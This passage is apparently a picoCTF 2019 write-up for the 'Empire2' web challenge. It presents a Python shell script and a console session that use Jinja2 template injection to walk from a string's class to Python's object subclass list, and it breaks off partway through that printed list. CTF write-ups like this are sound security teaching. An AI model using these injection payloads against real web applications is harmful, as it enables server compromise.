# Empire2
Web Exploitation, 450 points

## Description:
> Well done, Agent 513! Our sources say Evil Empire Co is passing secrets around when you log in: https://2019shell1.picoctf.com/problem/13253/, can you help us find it?


## Solution: 

This is the follow-up for [Empire1](Empire1.md). The website interface is the same, but the SQL injection vulnerability that worked last time is blocked now.

Instead, we have a Flask template injection vulnerability: (Some) Python code entered between double curly brackets is executed, and the output contains the response instead of the raw expression.

For example, we can enter:
```
{{4*4}}
```

And as a response, see:
```
Very Urgent: 16 
```

We'll use a slightly modified version of Empire1's shell utility to explore this challenge:

```python
import re
import html
import requests
from cmd import Cmd
from bs4 import BeautifulSoup

class Empire2(object):
    BASE_URL = "https://2019shell1.picoctf.com/problem/13253"
    
    def __init__(self):
        self.session = requests.Session() 
        
    def login(self, username, password):
        text = self.post(self.BASE_URL + "/login", {"username": username, "password": password})
        if "Invalid username or password" in text:
            raise Exception("Can't login")

    def post(self, uri, data):
        r = self.session.get(uri, headers = {"Referer": uri})
        csrf = self.get_csrf_token(r.text)
        d = {"csrf_token": csrf}
        d.update(data)
        r = self.session.post(uri, data = d, allow_redirects = True, headers = {"Referer": uri})
        if r.status_code != 200:
            raise Exception("Can't post to '{}'".format(uri))
        return r.text

    def add_item(self, item):
        text = self.post(self.BASE_URL + "/add_item", {"item": item})
        if "Item Added" not in text:
            raise Exception("Can't add item '{}'".format(item))

    def get_last_item(self):
        r = self.session.get(self.BASE_URL + "/list_items")

        # Due to a bug in the website, there is an incorrect "</body>" tag in the middle of the source code.
        # This causes BeautifulSoup to fail, so we just remote it
        html = r.text.replace("</body>", "", 1) 

        parsed_html = BeautifulSoup(html, "lxml")
        return parsed_html.body.find_all('div', attrs={'class':'well well-sm'})[-1].findChildren("li" , recursive=False)[0].get_text().replace("Very Urgent: ", "")


    def get_csrf_token(self, html):
        token = re.search(r'<input id="csrf_token" name="csrf_token" type="hidden" value="([^"]+)">', html, re.MULTILINE)
        if token is None:
            raise Exception("Can't find CSRF token")
        return token.group(1)

class MyPrompt(Cmd):
    def __init__(self):
        Cmd.__init__(self)
        self.site = Empire2()
        self.site.login("user", "password")
        print "Logged in"

    def do_exit(self, inp):
        return True
 
    def do_send(self, param):
        # Literal curly brackets are escaped by another set of curly brackets
        q = "{{{{{}}}}}".format(param) 
        print "Sending: '{}'".format(q)
        self.site.add_item(q)
        print self.site.get_last_item()
 
MyPrompt().cmdloop()
```

Since direct access to the Python built-ins is blocked, we'll build our way up using the same technique that worked in last year's [Flaskcards](/2018_picoCTF/Flaskcards.md).

Session:
```console
root@kali:/media/sf_CTFs/pico/Empire2# python shell.py
Logged in
(Cmd) send 4*4
Sending: '{{4*4}}'

16

(Cmd) send ''.__class__
Sending: '{{''.__class__}}'

<class 'str'>

(Cmd) send ''.__class__.mro()
Sending: '{{''.__class__.mro()}}'

[<class 'str'>, <class 'object'>]

(Cmd) send ''.__class__.mro()[1]
Sending: '{{''.__class__.mro()[1]}}'

<class 'object'>

(Cmd) send ''.__class__.mro()[1].__subclasses__()
Sending: '{{''.__class__.mro()[1].__subclasses__()}}'

[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class 'moduledef'>, <class 'module'>, <class 'BaseException'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib._installed_safely'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class 'zipimport.zipimporter'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_itemiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'types.DynamicClassAttribute'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'operator.itemgetter'>, <class 'operator.attrgetter'>, <class 'operator.methodcaller'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class 'collections._Link'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'functools.partialmethod'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'importlib.abc.Finder'>, <class 'importlib.abc.Loader'>, <class 'contextlib.ContextDecorator'>, <class 'uwsgi._Input'>, <class 'uwsgi.SymbolsImporter'>, <class 'uwsgi.ZipImporter'>, <class 'uwsgi.SymbolsZipImporter'>, <class '_ast.AST'>, <class 'enum.auto'>, <enum 'Enum'>, <class '_sre.SRE_Pattern'>, <class '_sre.SRE_Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.Pattern'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class '_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'tokenize.Untokenizer'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'Struct'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class '_pickle.Unpickler'>, <class '_pickle.Pickler'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.nodes.Node'>, <class '_hashlib.HASH'>, <class '_blake2.blake2b'>, <class '_blake2.blake2s'>, <class '_sha3.sha3_224'>, <class '_sha3.sha3_256'>, <class '_sha3.sha3_384'>, <class '_sha3.sha3_512'>, <class '_sha3.shake_128'>, <class '_sha3.shake_256'>, <class '_random.Random'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContextBase'>, <class 'jinja2.runtime.LoopContextIterator'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'decimal.Decimal'>, <class 'decimal.Context'>, <class 'decimal.SignalDictMixin'>, <class 'decimal.ContextManager'>, <class 'numbers.Number'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class '__future__._Feature'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.SpooledTemporaryFile'>, <class 'tempfile.TemporaryDirectory'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'select.poll'>, <class 'select.epoll'>, <class 'selectors.BaseSelector'>, <class 'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'concurrent.futures._base._Waiter'>, <class 'concurrent.futures._base._AcquireFutures'>, <class 'concurrent.futures._base.Future'>, <class 'concurrent.futures._base.Executor'>, <class 'queue.Queue'>, <class 'multiprocessing.process.BaseProcess'>, <class '_socket.socket'>, <class 'array.array'>, <class 'multiprocessing.reduction._C'>, <class 'multiprocessing.reduction.AbstractReducer'>, <class 'multiprocessing.context.BaseContext'>, <class '_multiprocessing.SemLock'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class 'multiprocessing.util.Finalize'>, <class 'multiprocessing.util.ForkAwareThreadLock'>, <class 'multiprocessing.connection._ConnectionBase'>, <class 'multiprocessing.connection.Listener'>, <class 'multiprocessing.connection.SocketListener'>, <class 'multiprocessing.connection.ConnectionWrapper'>, <class 'concurrent.futures.process._ExceptionWithTraceback'>, <class 'concurrent.futures.process._WorkItem'>, <class 'concurrent.futures.process._ResultItem'>, <class 'concurrent.futures.process._CallItem'>, <class 'concurrent.futures.thread._WorkItem'>, <class 'ast.NodeVisitor'>, <class 'dis.Bytecode'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'asyncio.events.Handle'>, <class 'asyncio.events.AbstractServer'>, <class 'asyncio.events.AbstractEventLoop'>, <class 'asyncio.events.AbstractEventLoopPolicy'>, <class 'asyncio.coroutines.CoroWrapper'>, <class 'asyncio.futures._TracebackLogger'>, <class 'asyncio.futures.Future'>, <class '_asyncio.Future'>, <class '_asyncio.FutureIter'>, <class 'TaskStepMethWrapper'>, <class 'TaskWakeupMethWrapper'>, <class 'asyncio.locks._ContextManager'>, <class 'asyncio.locks._ContextManagerMixin'>, <class 'asyncio.locks.Event'>, <class 'asyncio.protocols.BaseProtocol'>, <class 'asyncio.queues.Queue'>, <class 'asyncio.streams.StreamWriter'>, <class 'asyncio.streams.StreamReader'>, <class 'asyncio.subprocess.Process'>, <class 'asyncio.transports.BaseTransport'>, <class 'ipaddress._IPAddressBase'>, <class 'ipaddress._BaseV4'>, <class 'ipaddress._IPv4Constants'>, <class 'ipaddress._BaseV6'>, <class 'ipaddress._IPv6Constants'>, <class 'textwrap.TextWrapper'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, <class '_ssl.MemoryBIO'>, <class '_ssl.Session'>, <class 'ssl.SSLObject'>, <class 'asyncio.sslproto._SSLPipe'>, <class 'asyncio.unix_events.AbstractChildWatcher'>, <class 'jinja2.asyncsupport.AsyncLoopContextIterator'>, <class 'datetime.date'>, <class 'datetime.timedelta'>, <class 'datetime.time'>, <class 'datetime.tzinfo'>, <class 'werkzeug._internal._Missing'>, <class 'werkzeug._internal._DictAccessorProperty'>, <class 'pkgutil.ImpImporter'>, <class 'pkgutil.ImpLoader'>, <class 'werkzeug.utils.HTMLBuilder'>, <class 'werkzeug.exceptions.Aborter'>, <class 'werkzeug.urls.Href'>, <class 'socketserver.BaseServer'>, <class 'socketserver.ForkingMixIn'>, <class 'socketserver.ThreadingMixIn'>, <class 'socketserver.BaseRequestHandler'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class 'email.charset.Charset'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class 'email._policybase._PolicyBase'>, <class 'email.feedparser.BufferedSubFile'>, <class 'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 'email.parser.BytesParser'>, <class 'email.message.Message'>, <class 'http.client.HTTPConnection'>, <class 'mimetypes.MimeTypes'>, <class 'gettext.NullTranslations'>, <class 'argparse._AttributeHolder'>, <class 'argparse.HelpFormatter._Section'>, <class 'argparse.HelpFormatter'>, <class 'argparse.FileType'>, <class 'argparse._ActionsContainer'>, <class 'werkzeug.serving.WSGIRequestHandler'>, <class 'werkzeug.serving._SSLContext'>, <class 'werkzeug.serving.BaseWSGIServer'>, <class 'werkzeug.datastructures.ImmutableListMixin'>, <class 'werkzeug.datastructures.ImmutableDictMixin'>, <class 'werkzeug.datastructures.UpdateDictMixin'>, <class 'werkzeug.datastructures.ViewItems'>, <class 'werkzeug.datastructures._omd_bucket'>, <class 'werkzeug.datastructures.Headers'>, <class 'werkzeug.datastructures.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.IfRange'>, <class 'werkzeug.datastructures.Range'>, <class 'werkzeug.datastructures.ContentRange'>, <class 'werkzeug.datastructures.FileStorage'>, <class 'urllib.request.Request'>, <class 'urllib.request.OpenerDirector'>, <class 'urllib.request.BaseHandler'>, <class 'urllib.request.HTTPPasswordMgr'>, <class 'urllib.request.AbstractBasicAuthHandler'>, <class 'urllib.request.AbstractDigestAuthHandler'>, <class 'urllib.request.URLopener'>, <class 'urllib.request.ftpwrapper'>, <class 'werkzeug.wrappers.accept.AcceptMixin'>, <class 'werkzeug.wrappers.auth.AuthorizationMixin'>, <class 'werkzeug.wrappers.auth.WWWAuthenticateMixin'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.wrappers.base_request.BaseRequest'>, <class 'werkzeug.wrappers.base_response.BaseResponse'>, <class 'werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin'>, <class 'werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin'>, <class 'werkzeug.wrappers.etag.ETagRequestMixin'>, <class 'werkzeug.wrappers.etag.ETagResponseMixin'>, <class 'werkzeug.useragents.UserAgentParser'>, <class 'werkzeug.useragents.UserAgent'>, <class 'werkzeug.wrappers.user_agent.UserAgentMixin'>, <class 'werkzeug.wrappers.request.StreamOnlyMixin'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.wrappers.response.ResponseStreamMixin'>, <class 'http.cookiejar.Cookie'>, <class 'http.cookiejar.CookiePolicy'>, <class 'http.cookiejar.Absent'>, <class 'http.cookiejar.CookieJar'>, <class 'werkzeug.test._TestCookieHeaders'>, <class 'werkzeug.test._TestCookieResponse'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <class 'uuid.UUID'>, <class 'CArgObject'>, <class '_ctypes.CThunkObject'>, <class '_ctypes._CData'>, <class '_ctypes.CField'>, <class '_ctypes.DictRemover'>, <class 'ctypes.CDLL'>, <class 'ctypes.LibraryLoader'>, <class 'itsdangerous._json._CompactJSON'>, <class 'hmac.HMAC'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous.serializer.Serializer'>, <class 'itsdangerous.url_safe.URLSafeSerializerMixin'>, <class 'flask._compat._DeprecatedBool'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalStack'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local.LocalProxy'>, <class 'difflib.SequenceMatcher'>, <class 'difflib.Differ'>, <class 'difflib.HtmlDiff'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class 'werkzeug.routing.RuleFactory'>, <class 'werkzeug.routing.RuleTemplate'>, <class 'werkzeug.routing.BaseConverter'>, <class 'werkzeug.routing.Map'>, <class 'werkzeug.routing.MapAdapter'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.types.ParamType'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'blinker._saferef.BoundMethodWeakref'>, <class 'blinker._utilities._symbol'>, <class 'blinker._utilities.symbol'>, <class 'blinker._utilities.lazy_property'>, <class 'blinker.base.Signal'>, <class 'flask.helpers.locked_cached_property'>, <class 'flask.helpers._PackageBoundObject'>, <class 'flask.cli.DispatchingApp'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.config.ConfigAttribute'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'werkzeug.wrappers.json._JSONModule'>, <class 'werkzeug.wrappers.json.JSONMixin'>, <class 'flask.blueprints.BlueprintSetupState'>, <class 'app.config.Config'>, <class 'configparser.Interpolation'>, <class 'sqlalchemy.util._collections.ImmutableContainer'>, <class 'sqlalchemy.util._collections.Properties'>, <class 'sqlalchemy.util._collections.IdentitySet'>, <class 'sqlalchemy.util._collections.WeakSequence'>, <class 'sqlalchemy.util._collections.UniqueAppender'>, <class 'sqlalchemy.util._collections.ScopedRegistry'>, <class 'sqlalchemy.exc.DontWrapMixin'>, <class 'sqlalchemy.util.langhelpers.safe_reraise'>, <class 'sqlalchemy.util.langhelpers.PluginLoader'>, <class 'sqlalchemy.util.langhelpers.portable_instancemethod'>, <class 'sqlalchemy.util.langhelpers.memoized_property'>, <class 'sqlalchemy.util.langhelpers.group_expirable_memoized_property'>, <class 'sqlalchemy.util.langhelpers.MemoizedSlots'>, <class 'sqlalchemy.util.langhelpers.dependencies._importlater'>, <class 'sqlalchemy.util.langhelpers.dependencies'>, <class 'sqlalchemy.util.langhelpers.hybridproperty'>, <class 'sqlalchemy.util.langhelpers.hybridmethod'>, <class 'sqlalchemy.util.langhelpers.symbol'>, <class 'sqlalchemy.sql.visitors.Visitable'>, <class 'sqlalchemy.sql.visitors.ClauseVisitor'>, <class 'sqlalchemy.sql.base.Immutable'>, <class 'sqlalchemy.sql.base.DialectKWArgs'>, <class 'sqlalchemy.sql.base.Generative'>, <class 'sqlalchemy.sql.base.SchemaEventTarget'>, <class 'sqlalchemy.sql.operators.Operators'>, <class 'sqlalchemy.sql.operators.custom_op'>, <class 'sqlalchemy.sql.type_api.Emulated'>, <class 'sqlalchemy.sql.type_api.NativeForEmulated'>, <class 'sqlalchemy.sql.annotation.Annotated'>, <class 'sqlalchemy.sql.selectable.HasPrefixes'>, <class 'sqlalchemy.sql.selectable.HasSuffixes'>, <class 'sqlalchemy.sql.selectable.HasCTE'>, <class 'sqlalchemy.event.registry._EventKey'>, <class 'sqlalchemy.event.attr._empty_collection'>, <class 'sqlalchemy.event.base._UnpickleDispatch'>, <class 'sqlalchemy.event.base._Dispatch'>, <class 'sqlalchemy.event.base.Events'>, <class 'sqlalchemy.event.base._JoinedDispatcher'>, <class 'sqlalchemy.event.base.dispatcher'>, <class 'sqlalchemy.sql.schema._NotAColumnExpr'>, <class 'sqlalchemy.sql.schema.ColumnCollectionMixin'>, <class 'sqlalchemy.sql.schema._SchemaTranslateMap'>, <class 'sqlalchemy.cprocessors.UnicodeResultProcessor'>, <class 'sqlalchemy.DecimalResultProcessor'>, <class 'sqlalchemy.sql.sqltypes._LookupExpressionAdapter'>, <class 'sqlalchemy.sql.sqltypes.Concatenable'>, <class 'sqlalchemy.sql.sqltypes.Indexable'>, <class 'sqlalchemy.sql.util._repr_base'>, <class 'sqlalchemy.sql.util.ColumnAdapter._IncludeExcludeMapping'>, <class 'sqlalchemy.sql.functions._FunctionGenerator'>, <class 'sqlalchemy.sql.compiler.Compiled'>, <class 'sqlalchemy.sql.compiler.TypeCompiler'>, <class 'sqlalchemy.sql.compiler.IdentifierPreparer'>, <class 'sqlalchemy.engine.interfaces.Dialect'>, <class 'sqlalchemy.engine.interfaces.CreateEnginePlugin'>, <class 'sqlalchemy.engine.interfaces.ExecutionContext'>, <class 'sqlalchemy.engine.interfaces.Connectable'>, <class 'sqlalchemy.engine.interfaces.ExceptionContext'>, <class 'sqlalchemy.interfaces.PoolListener'>, <class 'sqlalchemy.interfaces.ConnectionProxy'>, <class 'sqlalchemy.log.Identified'>, <class 'sqlalchemy.log.InstanceLogger'>, <class 'sqlalchemy.log.echo_property'>, <class 'sqlalchemy.engine.base.Transaction'>, <class 'sqlalchemy.engine.base.Engine._trans_ctx'>, <class 'sqlalchemy.engine.url.URL'>, <class 'sqlalchemy.pool.base._ConnDialect'>, <class 'sqlalchemy.pool.base._ConnectionRecord'>, <class 'sqlalchemy.pool.base._ConnectionFairy'>, <class 'sqlalchemy.util.queue.Queue'>, <class 'sqlalchemy.pool.dbapi_proxy._DBProxy'>, <class 'sqlalchemy.engine.strategies.EngineStrategy'>, <class 'sqlalchemy.cresultproxy.BaseRowProxy'>, <class 'sqlalchemy.engine.result.ResultMetaData'>, <class 'sqlalchemy.engine.result.ResultProxy'>, <class 'sqlalchemy.sql.naming.ConventionDict'>, <class 'sqlalchemy.engine.reflection.Inspector'>, <class 'sqlalchemy.orm.base.InspectionAttr'>, <class 'sqlalchemy.orm.base._MappedAttribute'>, <class 'sqlalchemy.orm.collections._PlainColumnGetter'>, <class 'sqlalchemy.orm.collections._SerializableColumnGetter'>, <class 'sqlalchemy.orm.collections._SerializableAttrGetter'>, <class 'sqlalchemy.orm.collections.collection'>, <class 'sqlalchemy.orm.collections.CollectionAdapter'>, <class 'sqlalchemy.orm.path_registry.PathRegistry'>, <class 'sqlalchemy.orm.interfaces.MapperOption'>, <class 'sqlalchemy.orm.interfaces.LoaderStrategy'>, <class 'sqlalchemy.orm.attributes.Event'>, <class 'sqlalchemy.orm.attributes.AttributeImpl'>, <class 'sqlalchemy.orm.state.AttributeState'>, <class 'sqlalchemy.orm.state.PendingCollection'>, <class 'sqlalchemy.orm.instrumentation._SerializeManager'>, <class 'sqlalchemy.orm.instrumentation.InstrumentationFactory'>, <class 'sqlalchemy.orm.util.AliasedClass'>, <class 'sqlalchemy.orm.strategy_options.loader_option'>, <class 'sqlalchemy.orm.loading.PostLoad'>, <class 'sqlalchemy.orm.deprecated_interfaces.MapperExtension'>, <class 'sqlalchemy.orm.deprecated_interfaces.SessionExtension'>, <class 'sqlalchemy.orm.deprecated_interfaces.AttributeExtension'>, <class 'sqlalchemy.orm.evaluator.EvaluatorCompiler'>, <class 'sqlalchemy.orm.persistence.BulkUD'>, <class 'sqlalchemy.orm.query.Query'>, <class 'sqlalchemy.orm.query._QueryEntity'>, <class 'sqlalchemy.orm.query.QueryContext'>, <class 'sqlalchemy.orm.unitofwork.UOWTransaction'>, <class 'sqlalchemy.orm.unitofwork.IterateMappersMixin'>, <class 'sqlalchemy.orm.unitofwork.PostSortRec'>, <class 'sqlalchemy.orm.dependency.DependencyProcessor'>, <class 'sqlalchemy.orm.relationships.JoinCondition'>, <class 'sqlalchemy.orm.relationships._ColInAnnotations'>, <class 'sqlalchemy.orm.identity.IdentityMap'>, <class 'sqlalchemy.orm.session._SessionClassMethods'>, <class 'sqlalchemy.orm.session.SessionTransaction'>, <class 'sqlalchemy.orm.scoping.scoped_session'>, <class 'sqlalchemy.orm.strategies.LoadDeferredColumns'>, <class 'sqlalchemy.orm.strategies.LoadLazyAttribute'>, <class 'sqlalchemy.orm.strategies.SubqueryLoader._SubqCollections'>, <class 'sqlalchemy.orm.dynamic.AppenderMixin'>, <class 'sqlalchemy.orm.dynamic.CollectionHistory'>, <class 'sqlalchemy.orm.events._InstrumentationEventsHold'>, <class 'sqlalchemy.orm.events._EventsHold.HoldEvents'>, <class 'sqlalchemy.ext.baked.Bakery'>, <class 'sqlalchemy.ext.baked.BakedQuery'>, <class 'sqlalchemy.ext.baked.Result'>, <class 'sqlalchemy.ext.declarative.clsregistry._MultipleClassMarker'>, <class 'sqlalchemy.ext.declarative.clsregistry._ModuleMarker'>, <class 'sqlalchemy.ext.declarative.clsregistry._ModNS'>, <class 'sqlalchemy.ext.declarative.clsregistry._GetColumns'>, <class 'sqlalchemy.ext.declarative.clsregistry._GetTable'>, <class 'sqlalchemy.ext.declarative.clsregistry._class_resolver'>, <class 'sqlalchemy.ext.declarative.base._MapperConfig'>, <class 'sqlalchemy.ext.declarative.api.ConcreteBase'>, <class 'sqlalchemy.ext.declarative.api.DeferredReflection'>, <class 'flask_sqlalchemy.model.NameMetaMixin'>, <class 'flask_sqlalchemy.model.BindMetaMixin'>, <class 'flask_sqlalchemy.model.Model'>, <class 'flask_sqlalchemy._SessionSignalEvents'>, <class 'flask_sqlalchemy._EngineDebuggingSignalEvents'>, <class 'flask_sqlalchemy.Pagination'>, <class 'flask_sqlalchemy._QueryProperty'>, <class 'flask_sqlalchemy._EngineConnector'>, <class 'flask_sqlalchemy._SQLAlchemyState'>, <class 'flask_sqlalchemy.SQLAlchemy'>, <class 'flask_login.mixins.UserMixin'>, <class 'flask_login.mixins.AnonymousUserMixin'>, <class 'flask_login.login_manager.LoginManager'>, <class 'wtforms.validators.EqualTo'>, <class 'wtforms.validators.Length'>, <class 'wtforms.validators.NumberRange'>, <class 'wtforms.validators.Optional'>, <class 'wtforms.validators.DataRequired'>, <class 'wtforms.validators.InputRequired'>, <class 'wtforms.validators.Regexp'>, <class 'wtforms.validators.Email'>, <class 'wtforms.validators.IPAddress'>, <class 'wtforms.validators.UUID'>, <class 'wtforms.validators.AnyOf'>, <class 'wtforms.validators.NoneOf'>, <class 'wtforms.validators.HostnameValidation'>, <class 'wtforms.widgets.core.ListWidget'>, <class 'wtforms.widgets.core.TableWidget'>, <class 'wtforms.widgets.core.Input'>, <class 'wtforms.widgets.core.TextArea'>, <class 'wtforms.widgets.core.Select'>, <class 'wtforms.widgets.core.Option'>, <class 'wtforms.i18n.DefaultTranslations'>, <class 'wtforms.i18n.DummyTranslations'>, <class 'wtforms.utils.UnsetValue'>, <class 'wtforms.utils.WebobInputWrapper'>, <class 'wtforms.fields.core.Field'>, <class 'wtforms.fields.core.UnboundField'>, <class 'wtforms.fields.core.Flags'>, <class 'wtforms.fields.core.Label'>, <class 'wtforms.meta.DefaultMeta'>, <class 'wtforms.form.BaseForm'>, <class 'dominate.dom_tag.dom_tag'>, <class 'dominate.dom1core.dom1core'>, <class 'visitor.Visitor'>, 